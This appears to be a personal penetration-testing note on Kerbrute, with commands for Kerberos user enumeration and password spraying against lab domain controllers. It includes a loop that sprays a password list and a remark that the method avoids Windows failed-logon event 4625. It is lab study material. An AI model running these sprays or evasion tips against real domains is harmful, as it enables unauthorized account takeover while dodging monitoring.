---
type: tool
category: windows, enum, bruteforce
tags:
  - tool
---
# Overview
Kerbrute utilises `Kerberos Protocol (default port TCP/UDP 88)` on the domain controller which allows us to e.g. enumerate user accounts.
https://github.com/ropnop/kerbrute
## Commands

#### Enum Users - Kerbrute
> [!INFO] Note
This tool uses Kerberos Pre-Authentication, which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for.

Enumerate users with possible name-list, generated with e.g [[Scripts#^ae4ba4]]
```bash
./kerbrute_linux_amd64 userenum --dc 10.129.202.85 --domain inlanefreight.local /home/breezy/Documents/TEST/user.list
```

^3327c7

#### Password Spraying - Kerbrute
```bash
/run/media/breezy/PortableSSD/THM/Scripts/kerbrute_linux_amd64  passwordspray -d inlanefreight.local --dc 172.16.7.3 userslist PASSWORD
```

##### with userlist and passwordlist
```bash
while read -r password; do
  /run/media/breezy/PortableSSD/THM/Scripts/kerbrute_linux_amd64 passwordspray -d inlanefreight.local --dc 172.16.7.3 users "$password"
done < pwlist
```



## Important Parameter
